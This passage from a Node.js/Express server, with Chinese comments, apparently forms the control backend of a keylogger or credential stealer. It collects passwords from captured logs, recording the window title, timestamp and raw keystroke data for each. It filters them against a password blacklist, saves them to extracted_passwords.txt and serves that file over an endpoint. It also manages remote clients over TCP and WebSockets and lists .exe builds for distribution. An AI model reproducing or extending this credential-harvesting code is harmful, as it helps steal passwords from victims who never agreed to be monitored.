    const filteredPasswords = allPasswords.filter(item => {
        return !isPasswordBlacklisted(item.password);
    });

    const uniquePasswords = [];
    const seenSet = new Set();
    for (const item of filteredPasswords) {
        const key = `${item.file}|${item.password}`;
        if (!seenSet.has(key)) {
            seenSet.add(key);
            uniquePasswords.push(item);
        }
    }
    uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));

    const resultFilename = 'extracted_passwords.txt';
    const resultContent = uniquePasswords.map((item, index) => {
        return `${index + 1}. 来自: ${item.file}\n` +
               `窗口: ${item.window || '未知'}\n` +
               `时间: ${item.timestamp}\n` +
               `内容: ${item.password}\n` +
               `原始数据: ${item.rawPassword}\n`;
    }).join('\n');

    const logsDir = path.join(__dirname, 'logs');
    if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
    await fs.promises.writeFile(path.join(logsDir, resultFilename), resultContent);
    logger.info(`成功保存提取结果到: ${resultFilename}, 密码数量: ${uniquePasswords.length}`);

    extractionCache.lastExtractTime = Date.now();
    extractionCache.passwords = uniquePasswords;
    extractionCache.fileMTimes.clear();
    for (const [filename, state] of currentFileStates.entries()) {
        extractionCache.fileMTimes.set(filename, state.mtime);
    }

    res.json({ success: true, count: uniquePasswords.length });
}));

app.post('/api/blacklist/test', asyncHandler(async (req, res) => {
    const { password } = req.body;
    if (!password || typeof password !== 'string') {
        return res.status(400).json({ error: '密码不能为空' });
    }
    
    await loadBlacklistCache();
    const isBlacklisted = isPasswordBlacklisted(password);
    const normalized = normalizePassword(password);
    
    res.json({ 
        success: true, 
        password: password,
        normalized: normalized,
        isBlacklisted: isBlacklisted
    });
}));

app.post('/api/blacklist', asyncHandler(async (req, res) => {
    const { password } = req.body;
    if (!password || typeof password !== 'string' || !password.trim()) {
        return res.status(400).json({ error: '密码不能为空' });
    }
    const normalizedPassword = normalizePassword(password);
    const passwordHash = hashPassword(normalizedPassword);
    await executeWithRetry(
        'INSERT IGNORE INTO password_blacklist (password_hash, password) VALUES (?, ?)',
        [passwordHash, normalizedPassword]
    );
    // 更新缓存
    blacklistCache.set(passwordHash, normalizedPassword);
    logger.debug('添加黑名单: ' + normalizedPassword);
    res.json({ success: true });
}));

app.get('/api/blacklist', asyncHandler(async (req, res) => {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(100, Math.max(5, parseInt(req.query.limit, 10) || 20));
    const offset = (page - 1) * limit;

    const totalCountRows = await executeWithRetry('SELECT COUNT(*) AS total FROM password_blacklist', []);
    const total = Array.isArray(totalCountRows) && totalCountRows[0] ? totalCountRows[0].total : 0;
    const totalPages = Math.max(1, Math.ceil(total / limit));

    const rows = await executeWithRetry(
        'SELECT id, password, password_hash, created_at FROM password_blacklist ORDER BY created_at DESC LIMIT ? OFFSET ?',
        [limit, offset]
    );
    res.json({ success: true, blacklist: rows, total, page, limit, totalPages });
}));

// ========== 版本管理 API ==========

// 获取 Alist 配置
app.get('/api/config', asyncHandler(async (req, res) => {
    res.json({
        success: true,
        config: {
            alistUrl: CONFIG.alist.url,
            alistBasePath: CONFIG.alist.basePath
        }
    });
}));

// 获取 Alist 文件列表
app.get('/api/alist/files', asyncHandler(async (req, res) => {
    const path = req.query.path || CONFIG.alist.versionPath;
    try {
        const files = await alistClient.listFiles(path);
        // 只过滤 .exe 文件
        const exeFiles = files
            .filter(f => f.filename && f.filename.toLowerCase().endsWith('.exe'))
            .map(f => ({
                name: f.filename,
                size: f.size,
                uploadTime: f.uploadTime
            }));
        res.json({
            success: true,
            files: exeFiles
        });
    } catch (error) {
        logger.error('获取 Alist 文件列表失败', { error: error.message, path });
        res.status(500).json({ success: false, error: '获取文件列表失败: ' + error.message });
    }
}));



app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
    const id = Number(req.params.id);
    if (!Number.isInteger(id) || id <= 0) return res.status(400).json({ success: false, error: '非法的黑名单 ID' });
    
    // 先获取要删除的哈希
    const rows = await executeWithRetry('SELECT password_hash FROM password_blacklist WHERE id = ?', [id]);
    if (rows.length === 0) return res.status(404).json({ success: false, error: '黑名单项不存在' });
    
    const result = await executeWithRetry('DELETE FROM password_blacklist WHERE id = ?', [id]);
    if (result.affectedRows === 0) return res.status(404).json({ success: false, error: '黑名单项不存在' });
    
    // 从缓存中移除
    blacklistCache.delete(rows[0].password_hash);
    logger.debug(`删除黑名单: ${normalizePassword(rows[0].password)}`);
    res.json({ success: true });
}));

app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
    const filePath = path.join(__dirname, 'logs', 'extracted_passwords.txt');
    try {
        await fs.promises.access(filePath, fs.constants.R_OK);
    } catch (e) {
        return res.status(404).send('提取结果文件不存在');
    }
    const content = await fs.promises.readFile(filePath, 'utf8');
    res.type('text/plain').send(content);
}));

// ========== 全局错误处理 ==========
app.use((err, req, res, next) => {
    logger.error('API 错误', { url: req.url, error: err.message, stack: err.stack });
    res.status(err.status || 500).json({
        error: err.message || '服务器内部错误',
        ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    });
});

// ========== 优雅关机 ==========
let shuttingDown = false;
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    if (shuttingDown) return;
    shuttingDown = true;
    logger.info('开始关机...');
    clearInterval(clientManager.heartbeatTimer);
    if (clientManager.tcpServer) clientManager.tcpServer.close();
    wss.clients.forEach(ws => ws.terminate());
    server.close(async () => {
        logger.info('HTTP 服务器已关闭');
        await pool.end();
        logger.info('数据库连接池已关闭');
        process.exit(0);
    });
}

// ========== 启动服务 ==========
(async () => {
    try {
        await clientManager.init();
        
        const httpsEnabled = process.env.HTTPS_ENABLED === 'true';
        let serverInstance = server;
        let protocol = 'http';
        let port = CONFIG.httpPort;
        
        if (httpsEnabled) {
            const keyPath = process.env.HTTPS_KEY_PATH;
            const certPath = process.env.HTTPS_CERT_PATH;
            
            if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
                generateSelfSignedCert();
            }
            
            if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
                const key = fs.readFileSync(keyPath);
                const cert = fs.readFileSync(certPath);
                serverInstance = https.createServer({ key, cert }, app);
                protocol = 'https';
                logger.info('HTTPS 模式已启用');
            } else {
                logger.warn('HTTPS 证书文件不存在，将使用 HTTP 模式');
            }
        }
        
        wss = new WebSocket.Server({ server: serverInstance });
        wss.on('connection', handleWebSocketConnection);
        
        serverInstance.listen(port, () => {
            logger.info(`${protocol.toUpperCase()} 服务运行在端口 ${port}`);
            logger.info(`访问 ${protocol}://localhost:${port}/login.html 打开管理界面`);
        });
    } catch (err) {
        logger.error('服务启动失败', { error: err.message, stack: err.stack });
        process.exit(1);
    }
})();